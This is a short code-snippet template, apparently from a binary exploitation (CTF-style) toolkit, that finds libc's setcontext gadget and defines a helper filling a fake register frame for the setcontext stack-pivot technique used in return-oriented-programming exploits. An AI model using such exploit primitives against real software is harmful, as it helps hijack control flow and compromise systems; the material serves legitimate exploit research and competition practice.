# HEADER
# name: setcontext-gadget
# prefix: setcontext-gadget
# description: set rdi as frame address, then jmp to $gadget. 'mov rdx, [rdi+8]; ... ; call qword ptr [rdx+0x20];' gadget may useful.
# author: keymoon

# VARIABLES
# _set_rsi: s_addr: lea rsi, [rel s_addr];

assert len(list(libc.gadget("mov rsp, qword ptr [rdx+0xa0]"))) == 2 # setcontext / swapcontext
setcontext_gadget = next(libc.gadget("mov rsp, qword ptr [rdx+0xa0]"))
def create_setcontext_gadget_frame(frame: List[Optional[int]], next_addr=None, rsp=None, rbx=None, rbp=None, r12=None, r13=None, r14=None, r15=None, rsi=None, rdi=None, rcx=None, r8=None, r9=None, rdx=None):
    assert 22 <= len(frame)
    def assign(ind, val):
        if val is not None: assert frame[ind] is None; frame[ind] = val
    assign(20, rsp)
    assign(16, rbx)
    assign(15, rbp)
    assign(9, r12)
    assign(10, r13)
    assign(11, r14)
    assign(12, r15)
    assign(21, next_addr)
    assign(14, rsi)
    assign(13, rdi)
    assign(19, rcx)
    assign(5, r8)
    assign(6, r9)
    assign(17, rdx)
